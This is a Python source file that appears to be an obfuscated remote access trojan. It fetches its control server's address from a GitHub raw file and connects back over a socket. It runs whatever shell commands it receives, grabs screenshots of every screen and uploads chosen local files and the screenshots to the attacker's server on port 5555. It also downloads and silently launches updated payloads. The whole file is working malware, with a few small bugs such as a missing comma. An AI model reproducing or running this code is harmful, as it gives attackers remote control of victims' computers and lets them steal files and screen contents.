import subprocess,socket,time,requests,os
from PIL import ImageGrab
rvJGbwlSMOGoSjZVLL = "05.12.24.3"
FIZiOeWdi = ""
vzuYZAqngJosCtWBkABjB = ""
znGBDWLLCcaYWDXiUr = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
wLSOwsgDKAJfuSZD = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
blHiHEnkNCGr = "!"
def AhWjxszCIBPsQ(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def jCUYwFmGgQQzPqEcTnwJn(s):
	jRwQFDXFzGeGLDHAA = s.recv(1024)
	if len(jRwQFDXFzGeGLDHAA)==0:
		return True
	EsohkuFEdumNu = jRwQFDXFzGeGLDHAA.decode("utf-8").replace("\n","")
	if not EsohkuFEdumNu.startswith(blHiHEnkNCGr):
		proc = subprocess.run(EsohkuFEdumNu, shell=True, capture_output=True)
		oXTOpLP = proc.stdout + proc.stderr
		s.send(oXTOpLP)
		return
	kxxkvxKVYMIkayGYmhFYnn = EsohkuFEdumNu.split(" ")[0][1:]
	if kxxkvxKVYMIkayGYmhFYnn == "download":
		hDQTZbljs(s, EsohkuFEdumNu)
	elif kxxkvxKVYMIkayGYmhFYnn == "screenshot":
		YItSMWMYUXpLnE(s)
	elif kxxkvxKVYMIkayGYmhFYnn == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
def hDQTZbljs(s, EsohkuFEdumNu):
	NmFYOWhPkAX = EsohkuFEdumNu.replace(blHiHEnkNCGr+"download ","").split(",")
	oXTOpLPs = ""
	for f in NmFYOWhPkAX:
		oXTOpLPs += UZylUReY(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(oXTOpLPs, "utf-8"))
def YItSMWMYUXpLnE(s):
	SFDxOUOlqugASByxubIcoKC = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	UtRmFjOLOwQaNEqwJZWz = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	SFDxOUOlqugASByxubIcoKC.save(UtRmFjOLOwQaNEqwJZWz)
	SFDxOUOlqugASByxubIcoKC.close()
	r = UZylUReY(UtRmFjOLOwQaNEqwJZWz, "api/sscap")
	os.remove(UtRmFjOLOwQaNEqwJZWz)
	s.send(bytes(r,"utf-8"))
def UZylUReY(SmoALJtQANWfzpTqjYu, WXtboOSLiGCDtCioGVaP, NvauonOneTVA=None):
	if not os.path.exists(SmoALJtQANWfzpTqjYu):
		return "[!] 404: "+SmoALJtQANWfzpTqjYu+"\n"
	headers = {"user":os.getlogin()}
	if NvauonOneTVA is not None:
		headers = {**headers, **NvauonOneTVA}
	requests.post("http://"+FIZiOeWdi+":5555/"+WXtboOSLiGCDtCioGVaP,
		files={"file":open(SmoALJtQANWfzpTqjYu, "rb")},
		headers=headers)
	return "[+] 200: "+SmoALJtQANWfzpTqjYu+"\n"
def OBRztdOxCOoTglooikrXQIX():
	global FIZiOeWdi, vzuYZAqngJosCtWBkABjB
	if FIZiOeWdi == "" or vzuYZAqngJosCtWBkABjB == "":
		jRwQFDXFzGeGLDHAA = requests.get(znGBDWLLCcaYWDXiUr).text.replace("\n","").split(":")
		FIZiOeWdi = jRwQFDXFzGeGLDHAA[0].strip()
		vzuYZAqngJosCtWBkABjB = jRwQFDXFzGeGLDHAA[1].strip()
		CrsTEolhyGbvhmYW = jRwQFDXFzGeGLDHAA[2].strip()
	return FIZiOeWdi, vzuYZAqngJosCtWBkABjB, CrsTEolhyGbvhmYW
def vsSHHqCxduNBRvMscoTW():
	khGIQBuWgBWmgPry = os.path.basename(__file__)
	fileType = khGIQBuWgBWmgPry.split(".")[-1]
	uCXBjfDymJWmnse = khGIQBuWgBWmgPry.replace("."+fileType,"") +"."+rvJGbwlSMOGoSjZVLL + "."+fileType
	SaoQSQTMwsqlQ = os.path.join(os.getcwd(), uCXBjfDymJWmnse)
	with open(uCXBjfDymJWmnse, "w+") as f:
		f.write(requests.get(wLSOwsgDKAJfuSZD+"file."+ "pyw" if SaoQSQTMwsqlQ.split(".")[-1].startswith("py") else "exe").text)
	if fileType == "exe":
		subprocess.run(".\\"+SaoQSQTMwsqlQ, stdin=None, stdout=None, stderr=None shell=True, close_fds=True, creationflags=DETACHED_PROCESS)
	elif fileType.startswith("py"):
		subprocess.run("python.exe "+SaoQSQTMwsqlQ, stdin=None, stdout=None, stderr=None, shell=True, close_fds=True, creationflags=DETACHED_PROCESS)
def ddojLNXmoNO():
	pass
def geXVMmFh():
	h, p, v = OBRztdOxCOoTglooikrXQIX()
	if rvJGbwlSMOGoSjZVLL != v:
		vsSHHqCxduNBRvMscoTW()
	ddojLNXmoNO()
	JlYtubSyOHwGNtLu = bytes("["+rvJGbwlSMOGoSjZVLL+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				AjLJjSDEXN=False
				try:
					s=AhWjxszCIBPsQ(h, p)
					while not AjLJjSDEXN:
						s.send(JlYtubSyOHwGNtLu)
						AjLJjSDEXN=jCUYwFmGgQQzPqEcTnwJn(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
geXVMmFh()
